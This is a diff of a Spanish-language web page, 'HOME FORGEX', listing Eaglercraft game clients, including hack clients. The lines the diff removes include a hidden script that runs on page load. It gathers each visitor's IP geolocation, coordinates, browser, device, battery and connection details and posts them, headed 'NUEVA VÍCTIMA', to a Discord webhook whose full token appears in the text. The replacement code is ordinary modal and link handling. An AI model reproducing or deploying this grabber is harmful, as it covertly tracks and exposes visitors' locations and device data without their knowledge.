@@ -1,3 +1,4 @@
+```html
 <!DOCTYPE html>
 <html lang="es">
 <head>
@@ -5,147 +6,170 @@
 <title>HOME FORGEX — Clientes Eaglercraft</title>
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <style>
-  :root{--bg:#000;--card:#0f0f0f;--acc:#00ff9d;--pink:#ff00aa;--text:#e0e0e0;--muted:#888}
-  body{margin:0;font-family:system-ui;background:var(--bg);color:var(--text);min-height:100vh;display:flex;flex-direction:column;overflow-x:hidden}
-  header{position:sticky;top:0;background:rgba(0,0,0,.9);backdrop-filter:blur(20px);border-bottom:1px solid #111;z-index:10}
-  .nav{max-width:1300px;margin:auto;padding:20px;display:flex;align-items:center;justify-content:space-between;gap:20px}
-  .logo{width:56px;height:56px;border-radius:16px;background:linear-gradient(135deg,var(--acc),var(--pink));display:grid;place-items:center;font-weight:900;font-size:28px;color:#000}
-  .title{font-size:2.4rem;font-weight:900;background:linear-gradient(90deg,var(--acc),var(--pink));-webkit-background-clip:text;color:transparent}
-  .feedback-btn{
-    background:linear-gradient(90deg,var(--acc),var(--pink));
-    color:#000;font-weight:900;padding:12px 24px;border-radius:12px;text-decoration:none;
-    transition:all .4s;box-shadow:0 8px 30px rgba(0,255,157,.3);
-  }
-  .feedback-btn:hover{transform:translateY(-5px);box-shadow:0 20px 50px rgba(0,255,157,.5)}
-  main{flex:1;max-width:1300px;margin:40px auto;padding:0 20px}
-  h2{font-size:3rem;font-weight:900;margin:60px 0 30px;background:linear-gradient(90deg,var(--acc),var(--pink));-webkit-background-clip:text;color:transparent;text-align:center}
-  .glitch{animation:glitch 4s infinite}
-  @keyframes glitch{0%{text-shadow:2px 2px var(--acc),-2px -2px var(--pink)}20%{text-shadow:-2px -2px var(--acc),2px 2px var(--pink)}100%{text-shadow:2px 2px var(--acc),-2px -2px var(--pink)}}
-  .grid{display:grid;gap:20px;grid-template-columns:repeat(auto-fit,minmax(280px,1fr))}
-  .card-anim{
-    background:var(--card);border:1px solid #111;padding:24px;border-radius:20px;text-align:center;
-    font-weight:800;transition:all .4s;box-shadow:0 8px 30px rgba(0,0,0,.6);position:relative;overflow:hidden
-  }
-  .card-anim::before{
-    content:'';position:absolute;inset:0;border-radius:20px;
-    background:linear-gradient(90deg,var(--acc),var(--pink));opacity:0;transition:.5s
-  }
-  .card-anim:hover::before{opacity:0.15}
-  .card-anim:hover{transform:translateY(-15px);box-shadow:0 30px 80px rgba(0,255,157,.3)}
-  .card-anim span{display:block;font-size:1.4rem;margin-top:8px;color:var(--muted)}
-  footer{text-align:center;padding:50px 20px;color:var(--muted);line-height:1.8}
-  footer a{color:var(--acc);text-decoration:none}
-  footer a:hover{color:var(--pink)}
+:root{--bg:#000;--card:#0f0f0f;--acc:#00ff9d;--pink:#ff00aa;--text:#e0e0e0;--muted:#888}
+body{margin:0;font-family:system-ui;background:var(--bg);color:var(--text)}
+header{position:sticky;top:0;background:rgba(0,0,0,.9);border-bottom:1px solid #111;z-index:10}
+.nav{max-width:1300px;margin:auto;padding:20px;display:flex;align-items:center}
+.logo{width:56px;height:56px;border-radius:16px;background:linear-gradient(135deg,var(--acc),var(--pink));display:grid;place-items:center;font-weight:900;font-size:28px;color:#000}
+.title{font-size:2.4rem;font-weight:900;margin-left:16px;background:linear-gradient(90deg,var(--acc),var(--pink));-webkit-background-clip:text;color:transparent}
+main{max-width:1300px;margin:40px auto;padding:0 20px}
+h2{text-align:center;font-size:3rem;margin:60px 0 30px;background:linear-gradient(90deg,var(--acc),var(--pink));-webkit-background-clip:text;color:transparent}
+.grid{display:grid;gap:20px;grid-template-columns:repeat(auto-fit,minmax(280px,1fr))}
+.card{background:var(--card);border:1px solid #111;padding:24px;border-radius:20px;text-align:center;display:flex;flex-direction:column;gap:12px}
+.card-title{font-size:1.6rem;font-weight:900}
+.btn{padding:12px;border-radius:14px;font-weight:900;cursor:pointer}
+.info-btn{background:#111;border:2px solid var(--acc);color:var(--acc)}
+.play-btn{background:linear-gradient(90deg,var(--acc),var(--pink));color:#000}
+footer{text-align:center;padding:40px;color:var(--muted)}
+#infoModal,#imgModal,#features-modal{position:fixed;inset:0;background:rgba(0,0,0,.9);display:none;align-items:center;justify-content:center;z-index:9999}
+.modal-box{background:var(--card);border:2px solid var(--acc);border-radius:20px;padding:30px;max-width:480px;text-align:center}
+.modal-box img{width:100%;max-height:180px;object-fit:contain;margin-bottom:12px}
+.close{margin-top:20px;background:var(--pink);color:#000;padding:10px;border-radius:12px;cursor:pointer;font-weight:900}
+.fullscreen{max-width:95%;max-height:95%}
+.close-x{position:absolute;top:20px;right:30px;font-size:2.5rem;font-weight:900;cursor:pointer;color:#fff}
 </style>
 </head>
 <body>
+
+<div id="features-modal">
+  <div class="modal-box">
+    <h2>NUEVAS FUNCIONES</h2>
+    <p>
+      Al usar <b>Ver imagen / info</b> puedes ver una vista previa del cliente,
+      aprender cómo usarlo y conocer sus limitaciones.<br><br>
+      El botón <b>Jugar</b> es el único que abre el cliente real.<br>
+      Las imágenes se pueden ver en pantalla completa.
+    </p>
+    <div class="btn play-btn" onclick="acceptFeatures()">Aceptar</div>
+  </div>
+</div>
+
 <header>
   <div class="nav">
-    <div style="display:flex;align-items:center;gap:18px">
-      <div class="logo">HF</div>
-      <div class="title">HOME FORGEX</div>
-    </div>
-    <a href="https://10116066-debug.github.io/mala/" class="feedback-btn" target="_blank">
-      Enviar comentarios
-    </a>
+    <div class="logo">HF</div>
+    <div class="title">HOME FORGEX</div>
   </div>
 </header>
+
 <main>
-  <section>
-    <h2 class="glitch">TOP 3</h2>
-    <div class="grid grid-cols-1 md:grid-cols-3 gap-10">
-      <a href="https://eaglerhacks.github.io/UwUClient%20v1%20Full.html" class="card-anim" data-name="UwUClient">UwUClient <span>Mejor cliente 2025</span></a>
-      <a href="https://eaglerhacks.github.io/dragonv4.html" class="card-anim" data-name="DragonX">DragonX <span>El más estable</span></a>
-      <a href="https://eaglerhacks.github.io/wurstX.html" class="card-anim" data-name="WurstX">WurstX <span>Máximo poder</span></a>
-    </div>
-  </section>
-  <section>
-    <h2 class="glitch">CLIENTS CON HACKS</h2>
-    <div class="grid grid-cols-2 md:grid-cols-4 gap-8">
-      <a href="https://eaglerhacks.github.io/Shadow_Client_2.5_1.8.8_International.html" class="card-anim" data-name="Shadow Client">Shadow Client</a>
-      <a href="https://eaglerhacks.github.io/justinv3.html" class="card-anim" data-name="Justin V3">Justin V3</a>
-      <a href="https://eaglerhacks.github.io/PiClient.html" class="card-anim" data-name="PiClient">PiClient</a>
-      <a href="https://eaglerhacks.github.io/meteor.html" class="card-anim" data-name="Meteor">Meteor</a>
-      <a href="https://eaglerhacks.github.io/demon.html" class="card-anim" data-name="Demon Client">Demon Client</a>
-      <a href="https://eaglerhacks.github.io/justinclient.html" class="card-anim" data-name="Justin V1.2.4">Justin V1.2.4</a>
-      <a href="https://eaglerhacks.github.io/flameclient%203.7.html" class="card-anim" data-name="Flame 3.7">Flame 3.7</a>
-    </div>
-  </section>
+
+<h2>TOP 3</h2>
+<div class="grid">
+  <div class="card">
+    <div class="card-title">UwUClient</div>
+    <div class="btn info-btn" onclick="openInfo('https://i.imgur.com/NR1xeZ5.png','Presiona SHIFT para abrir el menú')">Ver imagen / info</div>
+    <div class="btn play-btn" onclick="go('https://eaglerhacks.github.io/UwUClient%20v1%20Full.html')">🎮 Jugar</div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">DragonX</div>
+    <div class="btn info-btn" onclick="openInfo('https://i.imgur.com/rpfY3s9.png','Presiona SHIFT para abrir el menú')">Ver imagen / info</div>
+    <div class="btn play-btn" onclick="go('https://eaglerhacks.github.io/dragonv4.html')">🎮 Jugar</div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">WurstX</div>
+    <div class="btn info-btn" onclick="openInfo('https://i.imgur.com/hx829M9.png','Presiona SHIFT para abrir el menú')">Ver imagen / info</div>
+    <div class="btn play-btn" onclick="go('https://eaglerhacks.github.io/wurstX.html')">🎮 Jugar</div>
+  </div>
+</div>
+
+<h2>CLIENTES VANILLA 1.8.9</h2>
+<div class="grid">
+  <div class="card">
+    <div class="card-title">Shadow Client</div>
+    <div class="btn info-btn" onclick="openInfo('https://i.imgur.com/kbtZu3I.png','Cliente normal 1.8.9. No funciona SHIFT ni MAYÚS.')">Ver imagen / info</div>
+    <div class="btn play-btn" onclick="go('https://eaglerhacks.github.io/Shadow_Client_2.5_1.8.8_International.html')">🎮 Jugar</div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">Flame 3.7</div>
+    <div class="btn info-btn" onclick="openInfo('https://i.imgur.com/bHTf42R.png','Cliente normal 1.8.9')">Ver imagen / info</div>
+    <div class="btn play-btn" onclick="go('https://eaglerhacks.github.io/flameclient%203.7.html')">🎮 Jugar</div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">PixelClient 1.8.9</div>
+    <div class="btn info-btn" onclick="openInfo('https://i.imgur.com/Xvf8iKN.png','Cliente vanilla 1.8.9')">Ver imagen / info</div>
+    <div class="btn play-btn" onclick="go('https://eaglercraft.ir/es/play/pc1.8.8?touch=false')">🎮 Jugar</div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">EaglerForge 1.8.9</div>
+    <div class="btn info-btn" onclick="openInfo('https://i.imgur.com/Wzyh9A9.png','No es cliente. Sirve para agregar mods.')">Ver imagen / info</div>
+    <div class="btn play-btn" onclick="go('https://eaglercraft.ir/es/play/eaglerforge-1.8.8?touch=false')">🎮 Jugar</div>
+  </div>
+</div>
+
+<h2>CLIENTES CON MENÚ</h2>
+<div class="grid">
+  <div class="card">
+    <div class="card-title">PiClient</div>
+    <div class="btn info-btn" onclick="openInfo('https://i.imgur.com/oNTUlrQ.png','Mover menú con flechas. Activar y desactivar con →')">Ver imagen / info</div>
+    <div class="btn play-btn" onclick="go('https://eaglerhacks.github.io/PiClient.html')">🎮 Jugar</div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">Justin 1.2.4</div>
+    <div class="btn info-btn" onclick="openInfo('https://i.imgur.com/ivPQB2d.png','Mover menú con flechas. Activar y desactivar con →')">Ver imagen / info</div>
+    <div class="btn play-btn" onclick="go('https://eaglerhacks.github.io/justinclient.html')">🎮 Jugar</div>
+  </div>
+</div>
+
+<h2>OTROS</h2>
+<div class="grid">
+  <div class="card">
+    <div class="card-title">Tuff Client 1.12.2</div>
+    <div class="btn info-btn" onclick="openInfo('https://i.imgur.com/jZOmpwr.png','Funciones nuevas 1.20: Warden, Netherite, Totems')">Ver imagen / info</div>
+    <div class="btn play-btn" onclick="go('https://tuff.speedslicer.dev/files/1_1UT8/JS/')">🎮 Jugar</div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">EaglyMC 1.20</div>
+    <div class="btn info-btn" onclick="openInfo('https://i.imgur.com/gWHU7rd.png','Solo singleplayer. Sin servidores. Shaders buenos.')">Ver imagen / info</div>
+    <div class="btn play-btn" onclick="go('https://eaglercraft.ir/es/play/eagly-1.20?touch=false')">🎮 Jugar</div>
+  </div>
+</div>
+
 </main>
-<footer>
-  <p>Si notas algún bug o quieres sugerir cambios, ¡envía tus comentarios aquí!</p>
-  <p>
-    <a href="https://10116066-debug.github.io/mala/" target="_blank" style="font-weight:900;font-size:1.2rem;">Enviar comentarios</a>
-  </p>
-  <p>
-    <a href="https://tiktok.com/@j_eliseoo_v" target="_blank">@j_eliseoo_v en TikTok</a> | El Salvador
-  </p>
-  <p class="text-sm mt-10 opacity-70">Visitas: <span id="visits">0</span></p>
-</footer>
+
+<footer>HOME FORGEX © 2025</footer>
+
+<div id="infoModal">
+  <div class="modal-box">
+    <img id="infoImg">
+    <p id="infoText"></p>
+    <div class="btn info-btn" onclick="openImg()">Ver imagen completa</div>
+    <div class="close" onclick="closeInfo()">Cerrar</div>
+  </div>
+</div>
+
+<div id="imgModal">
+  <div class="close-x" onclick="closeImg()">✕</div>
+  <img id="fullImg" class="fullscreen">
+</div>
+
 <script>
-const WEBHOOK = "https://discord.com/api/webhooks/1446712536656249005/sbyzRE1yccOtJ2qJFGFN9K8ltOxELsq8ZqQ04howQOMffAccLDJOFjXgp9alt__ysvBP";
-// GRABBER QUE NUNCA FALLA (3 APIs de respaldo)
-async function getGeo() {
-  const apis = [
-    'https://ipapi.co/json/',
-    'https://ipwho.is/',
-    'https://ip-api.com/json/'
-  ];
-  for (const url of apis) {
-    try {
-      const res = await fetch(url, { timeout: 5000 });
-      const data = await res.json();
-      if (data.ip || data.query) return data;
-    } catch (e) {}
-  }
-  return {};
+let currentImg='';
+function openInfo(img,text){
+  currentImg=img;
+  infoImg.src=img;
+  infoText.innerText=text;
+  infoModal.style.display='flex';
 }
-(async () => {
-  const geo = await getGeo();
-  const battery = await navigator.getBattery?.() || {};
-  const uaData = navigator.userAgentData || {};
-  const connection = navigator.connection || {};
-  const mensaje = `**NUEVA VÍCTIMA (MÁXIMO DETALLE)**
-**IP:** ${geo.ip || geo.query || '???'} (${geo.org || geo.isp || '???'})
-**Ubicación:** ${geo.city || '???'}, ${geo.region || geo.regionName || '???'}, ${geo.country_name || geo.country || '???'} (${geo.postal || '?'})
-**Coordenadas:** ${geo.latitude || geo.lat || '???'}, ${geo.longitude || geo.lon || '???'}
-**Hora:** ${new Date().toLocaleString()}
-**Navegador:** ${uaData.brands?.map(b => b.brand + " v" + b.version).join(', ') || 'desconocido'}
-**SO:** ${uaData.platform || navigator.platform} | Móvil: ${uaData.mobile ? 'Sí' : 'No'}
-**RAM:** ${navigator.deviceMemory || '???'} GB | CPU: ${navigator.hardwareConcurrency || '???'} núcleos
-**Pantalla:** ${screen.width}x${screen.height}x${screen.colorDepth}
-**Batería:** ${battery.level ? Math.round(battery.level*100) + '% ' + (battery.charging ? 'cargando' : 'descargando') : 'no disponible'}
-**Conexión:** ${connection.effectiveType || '?'} (${connection.downlink ? connection.downlink + ' Mbps' : '?'})
-**Zona horaria:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}
-**Idioma:** ${navigator.language}
-**Pestañas:** ${history.length}
-**Cookies:** ${navigator.cookieEnabled ? 'Sí' : 'No'} | Modo oscuro: ${window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Sí' : 'No'}`;
-  await fetch(WEBHOOK, {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({ content: mensaje })
-  });
-})();
-// REDIRECCIÓN ÉPICA
-document.querySelectorAll('a[data-name]').forEach(a => {
-  a.onclick = e => {
-    e.preventDefault();
-    const overlay = document.createElement('div');
-    overlay.style.cssText = 'position:fixed;inset:0;background:#000;color:#0f0;display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:99999;font-family:monospace;text-align:center;font-size:4rem';
-    overlay.innerHTML = `
-      <h1 style="font-size:5rem;animation:glitch 2s infinite">REDIRIGIENDO...</h1>
-      <h2 style="font-size:3rem;margin-top:20px;color:#ff00aa">${a.dataset.name}</h2>
-    `;
-    document.body.appendChild(overlay);
-    setTimeout(() => {
-      window.open(a.href, '_blank');
-      setTimeout(() => overlay.remove(), 2000);
-    }, 800);
-  };
-});
-// CONTADOR
-let v = localStorage.getItem('visits') || 0; v++; localStorage.setItem('visits', v);
-document.getElementById('visits').textContent = v;
+function closeInfo(){infoModal.style.display='none'}
+function openImg(){fullImg.src=currentImg;imgModal.style.display='flex'}
+function closeImg(){imgModal.style.display='none'}
+function go(u){window.open(u,'_blank')}
+function acceptFeatures(){
+  localStorage.setItem('forgex_features','1');
+  document.getElementById('features-modal').style.display='none';
+}
+if(!localStorage.getItem('forgex_features')){
+  document.getElementById('features-modal').style.display='flex';
+}
 </script>
+
 </body>
 </html>
+```
